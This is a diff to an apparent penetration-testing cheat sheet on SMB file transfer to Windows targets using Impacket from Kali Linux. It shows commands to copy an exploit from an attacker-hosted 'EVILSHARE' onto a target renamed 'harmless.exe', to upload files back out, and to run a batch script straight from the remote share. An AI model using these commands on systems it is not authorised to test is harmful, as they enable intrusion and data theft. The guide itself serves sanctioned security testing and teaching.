@@ -226,7 +226,7 @@ cscript /nologo wget.js http://example.com
        `\     |___/|_|  |_||___/ 
        -`'                       
 ```
-SMB (or Samba) is the friend of anyone who has to work with Windows targets. The brazillian dancer works more often than you would expect and is rather easy to use. People often recommend that you use a Windows machine to pen test another Windows machine, but thanks to the Impacket project you can also use your regular Kali Linux machine.
+SMB (or Samba) is the preffered choice of anyone who has to work with Windows targets. The brazillian dancer is incredibly easy to use, you can just use the Windows `copy` command to transfer files to the target. Thanks to the Impacket project you can also use your regular Kali Linux machine to interact with SMB servers and even host your own SMB server on the fly.
 
 **Start instant local SMB server:**
 ```bash
@@ -258,8 +258,14 @@ copy \\<your_kali_ip>\EVILSHARE\exploit.exe C:\Temp\harmless.exe
 # upload file:
 copy localfile.txt \\<your_kali_ip>\EVILSHARE\localfile.txt
 ```
+Incredibly easy.
 
-You can't make it more easy than this.
+You can execute scritps/binaries without even copying them:
+```default
+\\<your_kali_ip>\EVILSHARE\coolscript.bat
+
+# script output here...
+```
 
 For completeness sake, you can also mount the share if you have the permissions:
 ```default
